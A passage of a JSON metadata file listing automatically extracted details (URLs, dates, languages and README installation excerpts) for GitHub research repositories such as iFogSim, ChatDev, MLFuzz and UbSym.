                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "118": {
        "filename": "Cloudslab_iFogSim_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Cloudslab/iFogSim",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-08-28T16:32:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T17:28:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1878972
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "119": {
        "filename": "chijianlei_SeqTrans_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/chijianlei/SeqTrans",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-12-30T13:48:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-19T07:25:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1452499
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 1147136
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 89633
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "120": {
        "filename": "joymallyac_Fair-SMOTE_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/joymallyac/Fair-SMOTE",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-05-24T04:32:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-06T20:59:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 7450512
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 96296
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 147
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "121": {
        "filename": "smartbugs_smartbugs-wild_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/smartbugs/smartbugs-wild",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-08-21T17:53:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-29T02:43:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 2578
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "122": {
        "filename": "Lpover_SourceP_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Lpover/SourceP",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "python3 evaluator.py -a dataset/test.txt -p result/predictions.txt 2>&1| tee result/score.log \n",
                    "original_header": "Evaluation"
                },
                "confidence": 0.9748809546844339,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Lpover/SourceP/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-04-12T03:53:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-08T12:42:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 4244146
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 240021
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 67254
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Solidity",
                    "name": "Solidity",
                    "type": "Programming_language",
                    "size": 29900
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Scheme",
                    "name": "Scheme",
                    "type": "Programming_language",
                    "size": 9528
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rust",
                    "name": "Rust",
                    "type": "Programming_language",
                    "size": 7172
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 1754
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "123": {
        "filename": "SoftwareSecurityLab_UbSym_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SoftwareSecurityLab/UbSym",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Now install project requirements using `requirements.txt` file:\n```\npip install -r requirements.txt\n```\nRunning Test Cases\n------------\nEverything is completed. Now you can test your desired code using our tool. We put some test cases from the [NIST SARD](https://samate.nist.gov/SRD/) benchmark vulnerable programs in this repository by which you can test our vulnerability detection tool.",
                    "type": "Text_excerpt",
                    "original_header": "Step 3: Installing Requirements",
                    "parent_header": [
                        "UbSym",
                        "Getting Started"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/SoftwareSecurityLab/UbSym/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "------------\nWe have tested our project on Ubuntu 18.04.1 LTS. \n<div align=\"center\">\n  <a href=\"https://github.com/SoftwareSecurityLab/Heap-Overflow-Detection\">\n    <img src=\"https://github.com/SoftwareSecurityLab/Heap-Overflow-Detection/blob/main/CWE122_Heap_Based_Buffer_Overflow__c_CWE193_char_cpy_01_bad.png\" alt=\"CWE122_Heap_Based_Buffer_Overflow__c_CWE193_char_cpy_01_bad\" width=\"1100\">\n  </a>\n</div>\n \n",
                    "original_header": "Notes"
                },
                "confidence": 0.9987995535919156,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SoftwareSecurityLab/UbSym/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-09-29T20:18:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-23T04:54:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 31013513
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 277699
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 22217
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 15808
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 103
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "124": {
        "filename": "jazzbob_stb_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/lenzbelzner/stb",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2017-02-27T15:11:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2017-02-27T15:35:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 7846
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "125": {
        "filename": "Smfakhoury_gazel_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Smfakhoury/gazel",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The iTrace-Atom plugin can be downloaded from atom's package manager, apm.  \nLink to package: https://atom.io/packages/itrace-atom \nLink to repository: https://github.com/devjeetr/itrace-atom \nAll documentation, including instructions for how to install the package and use the plugin are can be found at both links. Sample data can be found in the folder 'sample-experiment'. \n",
                    "original_header": "iTrace-Atom plugin"
                },
                "confidence": 0.9987121614328769,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Smfakhoury/gazel/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "gazel can be downloaded from PYPI  \nLink to library: https://pypi.org/project/gazel/\nLink to repository: https://github.com/devjeetr/gazel \nInstructions for installation, documentation of base functionality, and a jupyter notebook with the demo and sample data can be found at the link above. \n",
                    "original_header": "gazel"
                },
                "confidence": 0.9935626256464113,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Smfakhoury/gazel/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Link to the script: https://github.com/devjeetr/itrace-mocker \n",
                    "original_header": "Evaluation"
                },
                "confidence": 0.998540261646654,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Smfakhoury/gazel/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-11-20T22:11:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-02-12T17:51:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "126": {
        "filename": "OpenBMB_ChatDev_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/OpenBMB/ChatDev",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"center\">\n    \u3010English   | <a href=\"readme/README-Chinese.md\">Chinese</a> | <a href=\"readme/README-Japanese.md\">Japanese</a> | <a href=\"readme/README-Korean.md\">Korean</a> | <a href=\"readme/README-Filipino.md\">Filipino</a> | <a href=\"readme/README-French.md\">French</a> | <a href=\"readme/README-Slovak.md\">Slovak</a> | <a href=\"readme/README-Portuguese.md\">Portuguese</a> | <a href=\"readme/README-Spanish.md\">Spanish</a> | <a href=\"readme/README-Dutch.md\">Dutch</a> | <a href=\"readme/README-Turkish.md\">Turkish</a> | <a href=\"readme/README-Hindi.md\">Hindi</a> | <a href=\"readme/README-Bahasa-Indonesia.md\">Bahasa Indonesia</a> | <a href=\"readme/README-Russian.md\">Russian</a> | <a href=\"readme/README-Urdu.md\">Urdu</a>\u3011\n</p>\n<p align=\"center\">\n    \u3010\ud83d\udcda <a href=\"wiki.md\">Wiki</a> | \ud83d\ude80 <a href=\"wiki.md#visualizer\">Visualizer</a> | \ud83d\udc65 <a href=\"Contribution.md\">Community Built Software</a> | \ud83d\udd27 <a href=\"wiki.md#customization\">Customization</a> | \ud83d\udc7e <a href=\"https://discord.gg/bn4t2Jy6TT\")>Discord</a>\u3011 \n",
                    "original_header": "Communicative Agents for Software Development"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/OpenBMB/ChatDev/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* November 2, 2023: ChatDev is now supported with a new feature: incremental development, which allows agents to develop upon existing codes. Try `--config \"incremental\" --path \"[source_code_directory_path]\"` to start it.\n  <p align=\"center\">\n  <img src='./misc/increment.png' width=700>\n  </p> \n* October 26, 2023: ChatDev is now supported with Docker for safe execution (thanks to contribution from [ManindraDeMel](https://github.com/ManindraDeMel)). Please see [Docker Start Guide](wiki.md#docker-start).\n  <p align=\"center\">\n  <img src='./misc/docker.png' width=400>\n  </p>\n* September 25, 2023: The **Git** mode is now available, enabling the programmer <img src='visualizer/static/figures/programmer.png' height=20> to utilize Git for version control. To enable this feature, simply set ``\"git_management\"`` to ``\"True\"`` in ``ChatChainConfig.json``. See [guide](wiki.md#git-mode).\n  <p align=\"center\">\n  <img src='./misc/github.png' width=600>\n  </p>\n- September 20, 2023: The **Human-Agent-Interaction** mode is now available! You can get involved with the ChatDev team by playing the role of reviewer <img src='visualizer/static/figures/reviewer.png' height=20> and making suggestions to the programmer <img src='visualizer/static/figures/programmer.png' height=20>;\n  try ``python3 run.py --task [description_of_your_idea] --config \"Human\"``. See [guide](wiki.md#human-agent-interaction) and [example](WareHouse/Gomoku_HumanAgentInteraction_20230920135038).\n  <p align=\"center\">\n  <img src='./misc/Human_intro.png' width=600>\n  </p>\n- September 1, 2023: The **Art** mode is available now! You can activate the designer agent <img src='visualizer/static/figures/designer.png' height=20> to generate images used in the software;\n  try ``python3 run.py --task [description_of_your_idea] --config \"Art\"``. See [guide](wiki.md#art) and [example](WareHouse/gomokugameArtExample_THUNLP_20230831122822).\n- August 28, 2023: The system is publicly available.\n- August 17, 2023: The v1.0.0 version was ready for release.\n- July 30, 2023: Users can customize ChatChain, Phase, and Role settings. Additionally, both online Log mode and replay\n  mode are now supported.\n- July 16, 2023: The [preprint paper](https://arxiv.org/abs/2307.07924) associated with this project was published.\n- June 30, 2023: The initial version of the ChatDev repository was released.\n</details>\n \n",
                    "original_header": "\ud83c\udf89 News"
                },
                "confidence": 0.9927929633478683,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/OpenBMB/ChatDev/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<https://github.com/OpenBMB/ChatDev/assets/11889052/80d01d2f-677b-4399-ad8b-f7af9bb62b72>\n \n",
                    "original_header": "\u2753 What Can ChatDev Do?"
                },
                "confidence": 0.998083881578065,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/OpenBMB/ChatDev/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To get started, follow these steps: \n1. **Clone the GitHub Repository:** Begin by cloning the repository using the command: \n   ```\n   git clone https://github.com/OpenBMB/ChatDev.git\n   ``` \n2. **Set Up Python Environment:** Ensure you have a version 3.9 or higher Python environment. You can create and\n   activate this environment using the following commands, replacing `ChatDev_conda_env` with your preferred environment\n   name: \n   ```\n   conda create -n ChatDev_conda_env python=3.9 -y\n   conda activate ChatDev_conda_env\n   ``` \n3. **Install Dependencies:** Move into the `ChatDev` directory and install the necessary dependencies by running: \n   ```\n   cd ChatDev\n   pip3 install -r requirements.txt\n   ``` \n4. **Set OpenAI API Key:** Export your OpenAI API key as an environment variable. Replace `\"your_OpenAI_API_key\"` with\n   your actual API key. Remember that this environment variable is session-specific, so you need to set it again if you\n   open a new terminal session.\n   On Unix/Linux: \n5. **Build Your Software:** Use the following command to initiate the building of your software,\n   replacing `[description_of_your_idea]` with your idea's description and `[project_name]` with your desired project\n   name:\n   On Unix/Linux: \n   ```\n   python3 run.py --task \"[description_of_your_idea]\" --name \"[project_name]\"\n   ``` \n   ```\n   python run.py --task \"[description_of_your_idea]\" --name \"[project_name]\"\n   ``` \n6. **Run Your Software:** Once generated, you can find your software in the `WareHouse` directory under a specific\n   project folder, such as `project_name_DefaultOrganization_timestamp`. Run your software using the following command\n   within that directory:\n   On Unix/Linux: \n   ```\n   cd WareHouse/project_name_DefaultOrganization_timestamp\n   python3 main.py\n   ``` \n   ```\n   cd WareHouse/project_name_DefaultOrganization_timestamp\n   python main.py\n   ```\n \n",
                    "original_header": "\ud83d\udda5\ufe0f Quickstart with terminal"
                },
                "confidence": 0.9907235222832862,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/OpenBMB/ChatDev/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**Code**: We are enthusiastic about your interest in participating in our open-source project. If you come across any\nproblems, don't hesitate to report them. Feel free to create a pull request if you have any inquiries or if you are\nprepared to share your work with us! Your contributions are highly valued. Please let me know if there's anything else\nyou need assistance! \n**Software**: Whenever you develop software using ChatDev, a corresponding folder is generated containing all the\nessential information. Sharing your work with us is as simple as making a pull request. Here's an example: execute the\ncommand ``python3 run.py --task \"design a 2048 game\" --name \"2048\"  --org \"THUNLP\" --config \"Default\"``. This will\ncreate a software package and generate a folder named ``/WareHouse/2048_THUNLP_timestamp``. Inside, you'll find: \n",
                    "original_header": "\ud83e\udd17 Share Your Software"
                },
                "confidence": 0.9957879855312946,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/OpenBMB/ChatDev/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-28T02:18:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T16:06:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 556421
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 552297
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 126697
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 52314
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 48379
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 687
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "127": {
        "filename": "boschresearch_mlfuzz_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/boschresearch/mlfuzz",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "MLFuzz has been tested on Ubuntu 20.04 LTS.\nThis project uses `docker` to containerize dependency installation, build targets and run experiments.\nPlease see the official [installation page](https://docs.docker.com/engine/install/).\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup",
                    "parent_header": [
                        "MLFuzz - fuzzing with machine learning"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/boschresearch/mlfuzz/main/README.md"
            },
            {
                "result": {
                    "value": "We first build the 23 programs that will be used as targets for experiments:\n\n    cd MLFuzz/benchmarks\n    make\n",
                    "type": "Text_excerpt",
                    "original_header": "Build benchmark targets",
                    "parent_header": [
                        "MLFuzz - fuzzing with machine learning",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/boschresearch/mlfuzz/main/README.md"
            },
            {
                "result": {
                    "value": "Build Docker image for running experiments:\n\n    docker build . -t mlfuzz\n\nThis will make the `mlfuzz` image available for single or batch experiments.\n",
                    "type": "Text_excerpt",
                    "original_header": "Build experiment environment",
                    "parent_header": [
                        "MLFuzz - fuzzing with machine learning",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/boschresearch/mlfuzz/main/README.md"
            },
            {
                "result": {
                    "value": "All scripts for facilitating batch experiments and results post-processing are written in Python.\nThis project uses `python>=3.8` and [`poetry`](https://python-poetry.org/) for managing the Python environment.\nInstall `poetry` system-wide or in an empty virtual environment (e.g., created via `virtualenv` or `conda`).\nThen run\n\n    poetry install --without dev\n\nto install the project dependencies.\nNote that Neuzz++ and MLFuzz have the same Python dependencies; you only need to create one virtual environment for both of them.\nUse\n\n    poetry shell\n\nto activate the environment.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing Python dependencies",
                    "parent_header": [
                        "MLFuzz - fuzzing with machine learning",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/boschresearch/mlfuzz/main/README.md"
            },
            {
                "result": {
                    "value": "Fuzzing is resource-intensive, especially in terms of CPU usage.\nAll fuzzers in the AFL family require changes to the CPU configuration of the system they run on.\nTo make these, run the following commands as root on your system:\n\n    echo core >/proc/sys/kernel/core_pattern\n    cd /sys/devices/system/cpu\n    echo performance | tee cpu*/cpufreq/scaling_governor\n\nYou can later go back to the original state by replacing `performance` with `ondemand` or `powersave`. If you don't want to change the settings, set `AFL_SKIP_CPUFREQ` on all experiment runs to make `afl-fuzz` skip this check - but expect some performance drop.\n",
                    "type": "Text_excerpt",
                    "original_header": "Configuring CPUs for performance",
                    "parent_header": [
                        "MLFuzz - fuzzing with machine learning",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/boschresearch/mlfuzz/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "    MLFuzz/\n    \u251c\u2500\u2500 benchmarks/             # Folder containing Dockerfile and scripts for building fuzzing targets\n    \u251c\u2500\u2500 fuzzers/                # Folder containing scripts for running each fuzzer in a Docker container\n    \u251c\u2500\u2500 mlfuzz/                 # Python package with reusable utility functions\n    \u251c\u2500\u2500 scripts/                # Scripts for running experiments and postprocessing results\n    \u251c\u2500\u2500 CONTRIBUTING.md         # Guidelines for contributing extension to MLFuzz\n    \u251c\u2500\u2500 Dockerfile              # Dockerfile for the image running experiments\n    \u251c\u2500\u2500 LICENSE                 # License file\n    \u251c\u2500\u2500 poetry.lock             # Project requirements in Poetry format\n    \u251c\u2500\u2500 pyproject.toml          # Standard Python package description for pip\n    \u2514\u2500\u2500 README.md               # The present README file\n \n",
                    "original_header": "Project structure"
                },
                "confidence": 0.9999989923807067,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/boschresearch/mlfuzz/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-16T12:17:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-10T11:28:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 98351
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 7870
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1543
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 847
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "128": {
        "filename": "UofT-EcoSystem_rlscope_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/UofT-EcoSystem/rlscope",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "RL-Scope's complete documentation can be found here: <https://rl-scope.readthedocs.io/en/latest/index.html> \n",
                    "original_header": "RL-Scope: Cross-Stack Profiling for Deep Reinforcement Learning Workloads"
                },
                "confidence": 0.9978730786115777,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/UofT-EcoSystem/rlscope/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-12-12T04:20:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-25T18:39:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 2403767
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 1778279
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 215107
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 213526
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Cuda",
                    "name": "Cuda",
                    "type": "Programming_language",
                    "size": 101605
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 82389
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 44144
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 6338
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "GDB",
                    "name": "GDB",
                    "type": "Programming_language",
                    "size": 234
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 188
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "129": {
        "filename": "FlowSs_PMT_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/FlowSs/PMT",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-07-29T13:59:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-17T18:48:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 430016
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "130": {
        "filename": "panthap2_deep-jit-inconsistency-detection_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/panthap2/deep-jit-inconsistency-detection",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The AST diffs were built using Java files provided by [Pengyu Nie](https://github.com/pengyunie). First, download `ast-diffing-1.6-jar-with-dependencies.jar` from [here](https://drive.google.com/file/d/1JVfIfJoDDSFBaFOhK18UsBOmC39z03am/view?usp=sharing). Then, go to `data_processing/ast_diffing/python` and run:\n```\npython3 xml_diff_parser.py --old_sample_path=[PATH TO OLD VERSION OF CODE] --new_sample_path=[PATH TO NEW VERSION OF CODE] --jar_path=[PATH TO DOWNLOADED JAR FILE]\n```\nYou can see an example by running:\n```\npython3 xml_diff_parser.py --old_sample_path=../code_samples/old.java  --new_sample_path=../code_samples/new.java --jar_path=[PATH TO DOWNLOADED JAR FILE]\n```\n \n",
                    "original_header": "Deep Just-In-Time Inconsistency Detection Between Comments and Source Code"
